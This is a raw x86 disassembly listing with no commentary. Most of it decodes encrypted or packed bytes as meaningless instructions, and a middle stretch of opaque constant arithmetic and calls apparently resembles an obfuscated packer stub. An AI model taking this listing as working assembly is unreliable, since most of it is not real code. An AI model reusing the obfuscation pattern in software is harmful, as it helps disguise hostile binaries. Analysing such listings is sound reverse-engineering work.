  40f8b3:	sub    edx,DWORD PTR ds:0x44b87e2c
  40f8b9:	cmp    DWORD PTR [eax+edx*8],edi
  40f8bc:	mov    esp,0x9b49a76
  40f8c1:	fs jge 0x40f91b
  40f8c4:	(bad)  
  40f8c6:	jl     0x40f872
  40f8c8:	popa   
  40f8c9:	imul   esi,DWORD PTR [eax+eax*1-0x74c246db],0x17
  40f8d1:	mov    bh,BYTE PTR [ecx-0xe]
  40f8d4:	pop    edi
  40f8d5:	fwait
  40f8d6:	sub    eax,0xcb2a5ed2
  40f8db:	mov    esi,0x1855349d
  40f8e0:	mov    ebp,DWORD PTR [edx+0x638a9ce3]
  40f8e6:	dec    ebp
  40f8e7:	sbb    DWORD PTR [ebx],edx
  40f8e9:	xchg   edx,eax
  40f8ea:	es jg  0x5f3f38c7
  40f8f1:	mov    DWORD PTR [ecx],edi
  40f8f3:	je     0x40f8dd
  40f8f5:	add    al,0xbd
  40f8f7:	push   es
  40f8f8:	add    ah,BYTE PTR [ecx]
  40f8fa:	xor    BYTE PTR [edi-0x34],bl
  40f8fd:	aas    
  40f8fe:	das    
  40f8ff:	das    
  40f900:	idiv   DWORD PTR [edx-0x45]
  40f903:	scas   al,BYTE PTR es:[edi]
  40f904:	lods   eax,DWORD PTR ds:[esi]
  40f905:	popf   
  40f906:	daa    
  40f907:	lods   eax,DWORD PTR ds:[esi]
  40f908:	adc    BYTE PTR [eax+0x5d],0x67
  40f90c:	int    0xd8
  40f90e:	pop    edx
  40f90f:	cli    
  40f910:	rol    DWORD PTR [edx-0x5e09f230],cl
  40f916:	add    ch,BYTE PTR [edi]
  40f918:	in     eax,0x60
  40f91a:	push   cs
  40f91b:	imul   edi,eax,0xffffffb2
  40f91e:	sar    DWORD PTR [esi],0x50
  40f921:	sub    DWORD PTR [edx],ebp
  40f923:	dec    edx
  40f924:	sti    
  40f925:	or     DWORD PTR [esi-0x1731520],eax
  40f92b:	idiv   DWORD PTR [ecx]
  40f92d:	les    esi,FWORD PTR es:[eax-0x36ca4f57]
  40f934:	outs   dx,DWORD PTR ds:[esi]
  40f935:	aas    
  40f936:	lods   eax,DWORD PTR ds:[esi]
  40f937:	push   eax
  40f938:	inc    edi
  40f939:	inc    ebx
  40f93a:	or     BYTE PTR [ebp-0x30cf0e1f],al
  40f940:	sbb    DWORD PTR [esi],edx
  40f942:	leave  
  40f943:	inc    ecx
  40f944:	push   0xc1b30ba3
  40f949:	pop    ss
  40f94a:	addr16 pop edi
  40f94c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f94d:	sbb    bl,BYTE PTR [eax-0x34]
  40f950:	sti    
  40f951:	inc    eax
  40f952:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f953:	loope  0x40f976
  40f955:	adc    dl,ah
  40f957:	dec    eax
  40f958:	jb     0x40f8f9
  40f95a:	fistp  QWORD PTR [ebp-0x76935c4f]
  40f960:	xchg   ecx,eax
  40f961:	les    esi,FWORD PTR [ecx+ebp*1]
  40f964:	xchg   esp,eax
  40f965:	cdq    
  40f966:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f967:	jg     0x40f95a
  40f969:	gs or  eax,0x318ffb08
  40f96f:	popf   
  40f970:	idiv   ch
  40f972:	xor    esp,esp
  40f974:	(bad)  
  40f975:	stos   DWORD PTR es:[edi],eax
  40f976:	cmp    edi,DWORD PTR [eax+0x66683b41]
  40f97c:	jbe    0x40f9e8
  40f97e:	push   ebx
  40f97f:	sbb    DWORD PTR [ebx-0x365cf8d9],esp
  40f985:	ret    
  40f986:	std    
  40f987:	fcmovne st,st(2)
  40f989:	pop    ebx
  40f98a:	cli    
  40f98b:	cmp    eax,0xed934ba8
  40f990:	les    ecx,FWORD PTR [edi+0x3a]
  40f993:	fldcw  WORD PTR [edi-0x3d]
  40f996:	adc    al,0xdb
  40f998:	dec    ebx
  40f999:	retf   
  40f99a:	mov    WORD PTR [ebp-0x748e79d1],ss
  40f9a0:	cld    
  40f9a1:	popa   
  40f9a2:	pop    esp
  40f9a3:	jecxz  0x40fa07
  40f9a5:	xchg   edi,eax
  40f9a6:	push   ebp
  40f9a7:	xor    ebx,DWORD PTR [ecx+0xc8d9c3a]
  40f9ad:	lods   al,BYTE PTR ds:[esi]
  40f9ae:	ret    0x8c83
  40f9b1:	mov    WORD PTR [edx+0x13],es
  40f9b4:	aas    
  40f9b5:	mov    bh,0x0
  40f9b7:	repnz das 
  40f9b9:	pop    edi
  40f9ba:	push   cs
  40f9bb:	loope  0x40f992
  40f9bd:	loop   0x40f9d6
  40f9bf:	xchg   edi,eax
  40f9c0:	iret   
  40f9c1:	jnp    0x40f956
  40f9c3:	(bad)  
  40f9c4:	out    dx,eax
  40f9c5:	push   esi
  40f9c6:	inc    esi
  40f9c7:	(bad)  
  40f9c8:	push   edx
  40f9c9:	push   0x56
  40f9cb:	dec    DWORD PTR [ecx-0x2ba153b9]
  40f9d1:	jae    0x40fa4e
  40f9d3:	mov    cl,0x83
  40f9d5:	adc    esi,esp
  40f9d7:	xor    edi,DWORD PTR [ecx-0x3f37c00]
  40f9dd:	add    eax,0x826f7ae4
  40f9e2:	sub    eax,ecx
  40f9e4:	xor    eax,0xc3e
  40f9e9:	mov    DWORD PTR [ebp-0x58],eax
  40f9ec:	mov    DWORD PTR [ebp-0x14],0x66bd
  40f9f3:	pop    ecx
  40f9f4:	mov    DWORD PTR [ebp-0x4],ecx
  40f9f7:	mov    DWORD PTR [ebp-0x8],0x3374
  40f9fe:	mov    DWORD PTR [ebp-0xc],0x3c31
  40fa05:	mov    eax,DWORD PTR [ebp-0xc]
  40fa08:	mov    edx,DWORD PTR [ebp-0x8]
  40fa0b:	mov    esi,DWORD PTR [ebp-0x4]
  40fa0e:	xor    eax,edx
  40fa10:	xor    edx,edx
  40fa12:	div    esi
  40fa14:	mov    edx,DWORD PTR [ebp-0x14]
  40fa17:	and    eax,edx
  40fa19:	sub    eax,0x680
  40fa1e:	mov    DWORD PTR [ebp-0x24],eax
  40fa21:	mov    DWORD PTR [ebp-0x30],0x5f68
  40fa28:	mov    DWORD PTR [ebp-0x2c],0x398b
  40fa2f:	mov    DWORD PTR [ebp-0x4],0x5034
  40fa36:	mov    DWORD PTR [ebp-0x8],0x7cbf
  40fa3d:	mov    DWORD PTR [ebp-0xc],0x4f6c
  40fa44:	mov    DWORD PTR [ebp-0x14],0xee2
  40fa4b:	mov    eax,DWORD PTR [ebp-0x14]
  40fa4e:	add    eax,DWORD PTR [ebp-0xc]
  40fa51:	mov    edx,DWORD PTR [ebp-0x8]
  40fa54:	xor    eax,edx
  40fa56:	mov    edx,DWORD PTR [ebp-0x4]
  40fa59:	or     eax,edx
  40fa5b:	mov    edx,DWORD PTR [ebp-0x2c]
  40fa5e:	or     eax,edx
  40fa60:	mov    edx,DWORD PTR [ebp-0x30]
  40fa63:	and    eax,edx
  40fa65:	mov    edx,0x5b68
  40fa6a:	sub    edx,eax
  40fa6c:	mov    DWORD PTR [ebp-0x24],edx
  40fa6f:	mov    DWORD PTR [ebp-0x48],0x3308
  40fa76:	mov    DWORD PTR [ebp-0x44],0x59a4
  40fa7d:	mov    DWORD PTR [ebp-0x38],0x2775
  40fa84:	mov    DWORD PTR [ebp-0x34],0x4da
  40fa8b:	mov    DWORD PTR [ebp-0x40],0x49d8
  40fa92:	mov    DWORD PTR [ebp-0x3c],0x1b5c
  40fa99:	mov    DWORD PTR [ebp-0x28],0x338c
  40faa0:	mov    DWORD PTR [ebp-0x24],0x68ed
  40faa7:	mov    DWORD PTR [ebp-0x20],0x2a7b
  40faae:	mov    DWORD PTR [ebp-0x1c],0x718f
  40fab5:	mov    eax,DWORD PTR [ebp-0x20]
  40fab8:	mov    edx,DWORD PTR [ebp-0x1c]
  40fabb:	mov    esi,DWORD PTR [ebp-0x28]
  40fabe:	mov    ebx,DWORD PTR [ebp-0x24]
  40fac1:	add    eax,0xffffc948
  40fac6:	adc    edx,0xffff87b0
  40facc:	or     eax,esi
  40face:	mov    esi,DWORD PTR [ebp-0x40]
  40fad1:	or     eax,esi
  40fad3:	or     edx,ebx
  40fad5:	mov    ebx,DWORD PTR [ebp-0x3c]
  40fad8:	mov    esi,DWORD PTR [ebp-0x38]
  40fadb:	or     edx,ebx
  40fadd:	mov    ebx,DWORD PTR [ebp-0x34]
  40fae0:	sub    eax,esi
  40fae2:	mov    esi,DWORD PTR [ebp-0x48]
  40fae5:	sbb    edx,ebx
  40fae7:	mov    ebx,DWORD PTR [ebp-0x44]
  40faea:	or     eax,esi
  40faec:	or     edx,ebx
  40faee:	add    eax,0x89b
  40faf3:	mov    DWORD PTR [ebp-0x20],eax
  40faf6:	adc    edx,0x5a
  40faf9:	mov    DWORD PTR [ebp-0x1c],edx
  40fafc:	mov    DWORD PTR [ebp-0x80],0xfa4
  40fb03:	mov    DWORD PTR [ebp-0x70],0x618e
  40fb0a:	mov    DWORD PTR [ebp-0x6c],0x811
  40fb11:	mov    DWORD PTR [ebp-0x98],0x42d6904a
  40fb1b:	mov    DWORD PTR [ebp-0x94],0xe82c1
  40fb25:	mov    DWORD PTR [ebp-0x88],0x58ff
  40fb2f:	mov    DWORD PTR [ebp-0x84],0x7394
  40fb39:	xor    eax,eax
  40fb3b:	inc    eax
  40fb3c:	mov    DWORD PTR [ebp-0x64],eax
  40fb3f:	mov    DWORD PTR [ebp-0x8],0x5f59
  40fb46:	mov    DWORD PTR [ebp-0x4],0x652b
  40fb4d:	mov    DWORD PTR [ebp-0xc],0xf43
  40fb54:	mov    DWORD PTR [ebp-0x14],0x22dc
  40fb5b:	mov    DWORD PTR [ebp-0x2c],0x45d4
  40fb62:	mov    DWORD PTR [ebp-0x30],0x28e1
  40fb69:	mov    DWORD PTR [ebp-0x7c],0x5e09
  40fb70:	mov    DWORD PTR [ebp-0x50],0x3910
  40fb77:	mov    DWORD PTR [ebp-0x3c],0x5c97
  40fb7e:	mov    DWORD PTR [ebp-0x24],0x6111
  40fb85:	mov    DWORD PTR [ebp-0x78],ecx
  40fb88:	mov    DWORD PTR [ebp-0x34],ecx
  40fb8b:	mov    DWORD PTR [ebp-0x44],0x207a
  40fb92:	mov    DWORD PTR [ebp-0x60],eax
  40fb95:	mov    DWORD PTR [ebp-0x8c],0x7840
  40fb9f:	mov    DWORD PTR [ebp-0x4c],0x6b0b
  40fba6:	mov    eax,DWORD PTR [ebp-0x30]
  40fba9:	or     eax,0x70c5
  40fbae:	add    eax,DWORD PTR [ebp-0x2c]
  40fbb1:	mov    ecx,DWORD PTR [ebp-0x14]
  40fbb4:	or     eax,ecx
  40fbb6:	mov    ecx,0xce40
  40fbbb:	sub    ecx,eax
  40fbbd:	mov    eax,DWORD PTR [ebp-0xc]
  40fbc0:	sub    ecx,eax
  40fbc2:	imul   ecx,ecx,0x7480
  40fbc8:	add    ecx,DWORD PTR [ebp-0x58]
  40fbcb:	mov    eax,DWORD PTR [ebp-0x8]
  40fbce:	push   ecx
  40fbcf:	mov    ecx,DWORD PTR [ebp-0x4]
  40fbd2:	lea    eax,[ecx+eax*1-0x1e6d]
  40fbd9:	mov    ecx,DWORD PTR [ebp-0x64]
  40fbdc:	xor    edx,edx
  40fbde:	div    ecx
  40fbe0:	mov    ecx,DWORD PTR [ebp-0x74]
  40fbe3:	lea    eax,[eax+ecx*1-0xa617]
  40fbea:	push   eax
  40fbeb:	mov    eax,DWORD PTR [ebp-0x88]
  40fbf1:	mov    ecx,DWORD PTR [ebp-0x84]
  40fbf7:	push   0x770a
  40fbfc:	push   0x2a0c
  40fc01:	push   ecx
  40fc02:	push   eax
  40fc03:	call   0x416c20
  40fc08:	mov    ecx,DWORD PTR [ebp-0x98]
  40fc0e:	mov    esi,DWORD PTR [ebp-0x94]
  40fc14:	push   esi
  40fc15:	push   ecx
  40fc16:	or     edx,0x615d
  40fc1c:	or     eax,0x455c
  40fc21:	push   edx
  40fc22:	push   eax
  40fc23:	call   0x422046
  40fc28:	mov    ecx,DWORD PTR [ebp-0x70]
  40fc2b:	mov    edx,DWORD PTR [ebp-0x6c]
  40fc2e:	xor    eax,ecx
  40fc30:	mov    ecx,DWORD PTR [ebp-0x20]
  40fc33:	mov    edx,DWORD PTR [ebp-0x1c]
  40fc36:	mov    esi,DWORD PTR [ebp-0x80]
  40fc39:	and    eax,0xb49
  40fc3e:	add    esi,0x629b
  40fc44:	lea    eax,[eax+ecx*1-0xfd]
  40fc4b:	xor    esi,0x4994
  40fc51:	push   eax
  40fc52:	lea    esi,[ebp+esi*1-0x3c93]
  40fc59:	call   0x41066f
  40fc5e:	mov    ecx,eax
  40fc60:	mov    eax,DWORD PTR [ebp-0x50]
  40fc63:	mov    edx,DWORD PTR [ebp-0x7c]
  40fc66:	sub    eax,0x161
  40fc6b:	xor    eax,edx
  40fc6d:	imul   eax,eax,0x5151
  40fc73:	jmp    0x40ff41
  40fc78:	fiadd  WORD PTR [edi-0x46]
  40fc7b:	rcr    DWORD PTR [edx],1
  40fc7d:	dec    esp
  40fc7e:	fisub  DWORD PTR [esi]
  40fc80:	out    dx,eax
  40fc81:	mov    bl,BYTE PTR [ebp+0x61508770]
  40fc87:	jo     0x40fcff
  40fc89:	sahf   
  40fc8a:	sbb    BYTE PTR [eax],bl
  40fc8c:	mov    esi,0x7181814
  40fc91:	cli    
  40fc92:	das    
  40fc93:	cs loop 0x40fcf3
  40fc96:	fmul   DWORD PTR [eax]
  40fc98:	(bad)
  40fc9b:	dec    ebx
  40fc9c:	cmp    dh,bl
  40fc9e:	push   eax
  40fc9f:	xor    DWORD PTR [ecx-0x566bcc0d],edx
  40fca5:	nop
  40fca6:	sub    BYTE PTR [ebp+ecx*8+0x19],dh
  40fcaa:	clc    
  40fcab:	jge    0x40fca4
  40fcad:	dec    esp
  40fcae:	sbb    al,0x5c
  40fcb0:	mov    ecx,0x3e9dfc47
  40fcb5:	mov    dh,0x83
  40fcb7:	retf   0xf131
  40fcba:	clc    
  40fcbb:	mov    ah,0x7b
  40fcbd:	test   DWORD PTR [ecx],edi
  40fcbf:	jmp    0x40fc95
  40fcc1:	cmp    DWORD PTR [ecx+0x544a3a21],ebp
  40fcc7:	mov    edx,0xf450cdc8
  40fccc:	jnp    0x40fcf2
  40fcce:	jge    0x40fca8
  40fcd0:	fs mov bl,0x96
  40fcd3:	shr    BYTE PTR [edi-0x4ec2b3a4],1
  40fcd9:	(bad)  
  40fcdb:	add    ebp,ecx
  40fcdd:	inc    esp
  40fcde:	ror    BYTE PTR [ebx+0x6e],1
  40fce1:	pop    ecx
  40fce2:	xchg   ebx,eax
  40fce3:	add    dl,dh
  40fce5:	in     eax,0x44
  40fce7:	inc    edx
  40fce8:	leave  
  40fce9:	xchg   ebp,eax
  40fcea:	sub    BYTE PTR [esi-0x53],dl
  40fced:	in     al,dx
  40fcee:	xchg   esi,eax
  40fcef:	js     0x40fc90
  40fcf1:	sub    eax,0x5e364ccd
  40fcf6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fcf7:	or     BYTE PTR [eax],dl
  40fcf9:	xor    esi,DWORD PTR [ebx]
  40fcfb:	ja     0x40fd6b
  40fcfd:	outs   dx,DWORD PTR ds:[esi]
  40fcfe:	mov    ebx,0x7a77e77c
  40fd03:	inc    ebp
  40fd04:	mov    al,0x0
  40fd06:	gs jae 0x40fcee
  40fd09:	adc    DWORD PTR gs:[eax],0xee623540
  40fd10:	add    al,0xe8
  40fd12:	adc    eax,DWORD PTR [eax+esi*8+0x22]
  40fd16:	inc    edi
  40fd17:	xchg   esi,eax
  40fd18:	push   ecx
  40fd19:	jns    0x40fd52
  40fd1b:	loope  0x40fd44
  40fd1d:	(bad)
  40fd20:	push   ss
  40fd21:	add    al,0x49
  40fd23:	or     al,0x74
  40fd25:	add    ch,dl
  40fd27:	pusha  
  40fd28:	nop
  40fd29:	das    
  40fd2a:	add    al,0xb5
  40fd2c:	es repnz pop ebp
  40fd2f:	fisubr WORD PTR [esi]
  40fd31:	scas   eax,DWORD PTR es:[edi]
  40fd32:	jmp    0xccef3c1d
  40fd37:	xchg   ebp,eax
  40fd38:	xor    ecx,esp
  40fd3a:	sub    DWORD PTR [ebx],edx
  40fd3c:	(bad)  
  40fd3d:	test   BYTE PTR ds:0x6404f5ca,al
  40fd43:	(bad)  
  40fd44:	ror    BYTE PTR [esi+0x610f0c9e],cl
  40fd4a:	mov    ds:0x101c09b,al
  40fd4f:	pop    ss
  40fd50:	fst    QWORD PTR [esi-0xa2ebfa5]
  40fd56:	mov    al,ds:0x4bf6f54c
  40fd5b:	shl    DWORD PTR [ebp-0x43101780],1
  40fd61:	dec    esi
  40fd62:	jg     0x40fd64
  40fd64:	test   BYTE PTR [ecx+0x6f449f87],bh
  40fd6a:	div    DWORD PTR [ebp+0x5d8f878b]
  40fd70:	mov    al,0xee
  40fd72:	stos   DWORD PTR es:[edi],eax
  40fd73:	xor    eax,0xac1d4353
  40fd78:	inc    edx
  40fd79:	add    al,0x75
  40fd7b:	xor    DWORD PTR [edi+edi*1+0x17],esi
  40fd7f:	push   ecx
  40fd80:	sub    dh,BYTE PTR [edx-0x42]
  40fd83:	xchg   edi,eax
  40fd84:	enter  0x97dc,0x5d
  40fd88:	xchg   edi,eax
  40fd89:	scas   eax,DWORD PTR es:[edi]
  40fd8a:	jecxz  0x40fdaa
  40fd8c:	mov    edx,edi
  40fd8e:	adc    DWORD PTR [edx+0x277e628e],esp
  40fd94:	sar    DWORD PTR [ecx],1
  40fd96:	and    ax,0x3b7
  40fd9a:	out    dx,eax
  40fd9b:	mov    ?,WORD PTR [eax-0x65]
  40fd9e:	inc    esp
  40fd9f:	sub    BYTE PTR [ecx+esi*4+0xa],dh
  40fda3:	dec    ebp
  40fda4:	push   ebx
  40fda5:	fwait
  40fda6:	popa   
  40fda7:	jl     0x40fe23
  40fda9:	loopne 0x40fdd2
  40fdab:	aad    0xe
  40fdad:	push   ecx
  40fdae:	mov    dl,0x3a
  40fdb0:	sahf   
  40fdb1:	pop    edi
  40fdb2:	pop    ebp
  40fdb3:	popf   
  40fdb4:	mov    cl,ah
  40fdb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fdb7:	add    dh,ah
  40fdb9:	lods   al,BYTE PTR ds:[esi]
  40fdba:	(bad)  
  40fdbb:	pusha  
  40fdbc:	ja     0x40fe06
  40fdbe:	(bad)  
  40fdbf:	call   0x33ecb086
  40fdc4:	fstp   QWORD PTR [edx+0x10]
  40fdc7:	in     al,dx
  40fdc8:	mov    edx,0x67b1637d
  40fdcd:	and    DWORD PTR [esp+esi*4],esi
  40fdd0:	dec    ecx
  40fdd1:	add    DWORD PTR ss:[ebx],ecx
  40fdd4:	outs   dx,DWORD PTR ds:[esi]
  40fdd5:	fcomp  st(5)
  40fdd7:	imul   ebx,DWORD PTR [eax+0x1d2c52ba],0xffffffef
  40fdde:	sti    
  40fddf:	sbb    DWORD PTR [edi+0x9],esi
  40fde2:	mov    eax,ds:0x93bf7f53
  40fde7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fde8:	pop    eax
  40fde9:	sbb    esi,edx
  40fdeb:	and    al,0xb6
  40fded:	fisttp QWORD PTR [eax]
  40fdef:	jnp    0x40fd89
  40fdf1:	push   ebx
  40fdf2:	das    
  40fdf3:	xchg   edi,eax
  40fdf4:	test   BYTE PTR [esi-0x3702d258],0x0
  40fdfb:	mov    ch,0x84
  40fdfd:	add    eax,0x2a6bd815
  40fe02:	mov    ds:0xeb470a14,al
  40fe07:	loopne 0x40fddd
  40fe09:	test   BYTE PTR [edx-0x2602f8ca],dl
  40fe0f:	xlat   BYTE PTR ds:[ebx]
  40fe10:	sub    DWORD PTR [edx+0x3768e18d],0x2b
  40fe17:	mov    ds:0x285d6c2f,al
  40fe1c:	or     cl,BYTE PTR [esi+0x71054203]
  40fe22:	cdq    
  40fe23:	pop    esi
  40fe24:	cwde   
  40fe25:	sub    bh,BYTE PTR [ebx]
  40fe27:	xchg   ebp,eax
  40fe28:	jno    0x40fe44
  40fe2a:	es repz test eax,0x11aefde7
  40fe31:	mov    eax,DWORD PTR [eax-0x74]
  40fe34:	dec    esi
  40fe35:	bound  edi,QWORD PTR [ebx-0x5f]
  40fe38:	adc    BYTE PTR [ebp+0x719fa008],bl
  40fe3e:	ins    DWORD PTR es:[edi],dx
  40fe3f:	xlat   BYTE PTR ds:[ebx]
  40fe40:	add    eax,0x6ac8627e
  40fe45:	leave  
  40fe46:	mov    ebx,0xde0191a0
  40fe4b:	cmp    al,BYTE PTR [ecx+0x40]
  40fe4e:	pop    ecx
  40fe4f:	push   ss
  40fe50:	outs   dx,BYTE PTR ds:[esi]
  40fe51:	cwde   
  40fe52:	outs   dx,BYTE PTR ds:[esi]
  40fe53:	inc    eax
  40fe54:	(bad)  
  40fe55:	loop   0x40fdeb
  40fe57:	out    dx,eax
  40fe58:	and    BYTE PTR [esi],dl
  40fe5a:	pop    esi
  40fe5b:	fcom   QWORD PTR [esi+0xddf755d]
  40fe61:	mov    WORD PTR [edx],cs
  40fe63:	dec    ecx
  40fe64:	loop   0x40fe35
  40fe66:	clc    
  40fe67:	or     esi,eax
  40fe69:	enter  0xd2fb,0xf5
  40fe6d:	cdq    
  40fe6e:	dec    esi
  40fe6f:	or     ebp,DWORD PTR [eax+eax*1+0x40475faa]
  40fe76:	test   al,0xe7
  40fe78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe79:	pop    eax
  40fe7a:	daa    
  40fe7b:	test   BYTE PTR [edi-0x24cb3a3d],bh
  40fe81:	scas   eax,DWORD PTR es:[edi]
  40fe82:	outs   dx,BYTE PTR ds:[esi]
  40fe83:	lock xor BYTE PTR [esi-0x2c],0xeb
  40fe88:	sub    BYTE PTR [ebx-0x3cc1471f],0xe7
  40fe8f:	and    esi,DWORD PTR [eax+0x1e]
  40fe92:	into   
  40fe93:	xlat   BYTE PTR ds:[ebx]
  40fe94:	fidiv  DWORD PTR [ebx-0x2d]
  40fe97:	inc    esi
  40fe98:	dec    ebx
  40fe99:	inc    edi
  40fe9a:	das    
  40fe9b:	scas   al,BYTE PTR es:[edi]
  40fe9c:	(bad)  
  40fe9d:	fldenv [ebx+0x3e]
  40fea0:	shl    bh,cl
  40fea2:	test   al,dl
  40fea4:	jmp    0x40fe2d
  40fea6:	inc    eax
  40fea7:	sbb    eax,0x56
  40feaa:	imul   edi,DWORD PTR [ebx],0xf5877cc6
  40feb0:	or     dl,BYTE PTR [edx]
  40feb2:	and    ebp,DWORD PTR [edx]
  40feb4:	mov    eax,ds:0x47f076ce
  40feb9:	inc    ecx
  40feba:	sbb    DWORD PTR [ebx-0x2691fdbb],ebp
  40fec0:	mov    al,ds:0x509bdd4b
  40fec5:	mov    bh,0x23
  40fec7:	dec    eax
  40fec8:	mov    dl,0x8f
  40feca:	call   0x2359:0xde66ecd2
  40fed1:	xor    al,0x8a
  40fed3:	enter  0x93bb,0x98
  40fed7:	mov    esp,0xbe3ca5d3
  40fedc:	adc    ah,0x90
  40fedf:	fld    DWORD PTR [edi-0x62]
  40fee2:	jmp    0xe4d528b
  40fee7:	ftst   
  40fee9:	das    
  40feea:	push   0x36
  40feec:	cdq    
  40feed:	inc    esi
  40feee:	test   eax,0x177521cf
  40fef3:	stc    
  40fef4:	sahf   
  40fef5:	push   ebx
  40fef6:	xchg   esp,eax
  40fef7:	fcmovu st,st(2)
  40fef9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fefa:	and    ecx,esi
  40fefc:	je     0x40feb4
  40fefe:	nop
  40feff:	jnp    0x40ff2b
  40ff01:	or     al,0x55
  40ff03:	aam    0xcd
  40ff05:	cmp    bh,ch
  40ff07:	ja     0x40ff42
  40ff09:	(bad)  
  40ff0a:	cmp    BYTE PTR [edi],bl
  40ff0c:	mov    eax,0x2722c557
  40ff11:	push   ebx
  40ff12:	xlat   BYTE PTR ds:[ebx]
  40ff13:	cmp    DWORD PTR [ebx],edx
  40ff15:	sti    
  40ff16:	pop    eax
  40ff17:	mov    esp,0xa5b7b208
  40ff1c:	sbb    eax,0x8df2535f
  40ff21:	xchg   esi,eax
  40ff22:	and    al,0x51
  40ff24:	inc    edi
  40ff25:	outs   dx,BYTE PTR ds:[esi]
  40ff26:	arpl   ax,dx
  40ff28:	sub    BYTE PTR [edx],dh
  40ff2a:	add    eax,0xde1507f3
  40ff2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff30:	les    ebx,FWORD PTR [edi-0x77b8d71b]
  40ff36:	fnstsw WORD PTR [edi+ebx*2]
  40ff39:	call   0xca6a037e
  40ff3e:	(bad)  
  40ff3f:	mov    edi,0x3901059a
  40ff44:	add    BYTE PTR [eax],al
  40ff46:	xor    eax,0x40c2
  40ff4b:	xor    edx,edx
  40ff4d:	mov    esi,0x218f6c45
  40ff52:	div    esi
  40ff54:	cmp    ecx,eax
  40ff56:	jmp    0x410224
  40ff5b:	ss int 0x1f
  40ff5e:	jnp    0x40ff7a
  40ff60:	pop    ebx
  40ff61:	xor    bl,BYTE PTR [ebp+ebx*1+0x447c73b9]
  40ff68:	pop    eax
  40ff69:	mov    DWORD PTR [ebp+ebx*1-0x68],edi
  40ff6d:	sbb    BYTE PTR [eax],bl
  40ff6f:	mov    esi,0xe181814
  40ff74:	(bad)  
  40ff76:	fidivr WORD PTR [edx+ecx*8+0x56]
  40ff7a:	cmp    DWORD PTR [ebp+0x4da99e00],ebp
  40ff80:	mov    ebx,0x629d3300
  40ff85:	dec    esp
  40ff86:	xchg   ecx,eax
  40ff87:	mov    ds:0x142bc9ac,al
  40ff8c:	ja     0x40ff8c
  40ff8e:	repz data16 clc 
  40ff91:	loop   0x40ff92
  40ff93:	dec    esp
  40ff94:	sub    ecx,eax
  40ff96:	inc    ecx
  40ff97:	fisttp DWORD PTR [ecx-0x1e542305]
  40ff9d:	(bad)  
  40ff9f:	sbb    BYTE PTR ds:[ebp-0xc],dh
  40ffa3:	loop   0x40ff6b
  40ffa5:	xlat   BYTE PTR ds:[ebx]
  40ffa6:	mov    ch,0x66
  40ffa8:	pop    esp
  40ffa9:	outs   dx,BYTE PTR ds:[esi]
  40ffaa:	imul   eax,DWORD PTR [esi*4+0x29a4c52b],0x30
  40ffb2:	(bad)  
  40ffb3:	std    
  40ffb4:	bound  esi,QWORD PTR [eax-0x178c2242]
  40ffba:	in     al,0x77
  40ffbc:	pop    ecx
  40ffbe:	pushf  
  40ffbf:	cmp    al,0x22
  40ffc1:	lds    eax,FWORD PTR [edx]
  40ffc3:	call   0x22b7:0x70f90b88
  40ffca:	mov    edx,0x3939ab21
  40ffcf:	pop    esp
  40ffd0:	fldln2 
  40ffd2:	jmp    FWORD PTR [esi+0x3e338ac2]
  40ffd8:	mov    ds:0xd1fdbb4f,al
  40ffdd:	xchg   ebx,eax
  40ffde:	ja     0x40ff62
  40ffe0:	push   0x18
  40ffe2:	leave  
  40ffe3:	cmp    eax,ebp
  40ffe5:	push   es
  40ffe6:	rcr    BYTE PTR [eax+0x4],1
  40ffe9:	bound  esp,QWORD PTR [edx+eax*1-0x7de3c325]
  40fff0:	inc    ecx
  40fff1:	cwde   
  40fff2:	test   eax,0xd81feeec
  40fff7:	mov    ds:0xc4829004,al
  40fffc:	je     0x410025
  40fffe:	mov    esi,0x7f930a2b
  410003:	mov    BYTE PTR [eax-0x5b],al
  410006:	imul   ebx,eax,0x6a
  410009:	add    al,0x7b
  41000b:	sub    DWORD PTR [ecx-0x68],ecx
  41000e:	mov    edi,0x8a961fc7
  410013:	retf   
  410014:	cld    
  410015:	inc    DWORD PTR [ecx+0x6e]
  410018:	jo     0x40ffa6
  41001a:	xchg   DWORD PTR [edx+0x2283a1fb],ebp
  410020:	into   
  410021:	out    dx,eax
  410022:	adc    BYTE PTR [ebx-0x4180c162],bl
  410028:	jge    0x40ffd6
  41002a:	adc    cl,BYTE PTR [ecx]
  41002c:	dec    esi
  41002d:	inc    edi
  41002e:	shr    BYTE PTR ds:0x7c60c829,0x8c
  410035:	adc    ah,ch
  410037:	sbb    BYTE PTR [esi],0xc4
  41003a:	and    al,0xe8
  41003c:	test   eax,0xc12564d7
  410041:	ja     0x410038
  410043:	mov    es,WORD PTR [edx-0x61382669]
  410049:	jae    0x4100b4
  41004b:	mov    edx,0x5a6e3449
  410050:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410051:	dec    edi
  410052:	mov    bl,0x63
  410054:	aas    
  410055:	call   0xc221:0xb8e058c9
  41005c:	idiv   DWORD PTR [edi+0x2d]
  41005f:	in     eax,dx
  410060:	add    ah,BYTE PTR [ecx+edi*4-0xc]
  410064:	pushf  
  410065:	mov    edi,0x4828894f
  41006a:	fnstsw WORD PTR [ebx+0x5aff9665]
  410070:	xor    DWORD PTR [ecx-0x31],esi
  410073:	int3   
  410074:	stc    
  410075:	adc    bl,BYTE PTR [edx+0x33]
  410078:	xor    DWORD PTR [edi-0x73],edi
  41007b:	xlat   BYTE PTR ds:[ebx]
  41007c:	iret   
  41007d:	adc    bl,BYTE PTR ds:0x3b51151e
  410083:	inc    ebx
  410084:	pop    ebx
  410085:	call   0x91a5:0x581ade8e
  41008c:	xchg   ebx,eax
  41008d:	in     al,0xdf
  41008f:	dec    esi
  410090:	lods   al,BYTE PTR ds:[esi]
  410091:	jmp    0x5383:0xcd382301
  410098:	dec    ebp
  410099:	lds    eax,FWORD PTR [ebx+0xd8ba169]
  41009f:	in     al,0x9a
  4100a1:	sbb    esp,ebp
  4100a3:	bound  ebp,QWORD PTR [ecx+0x1]
  4100a6:	js     0x410107
  4100a8:	fnstsw WORD PTR [edi]
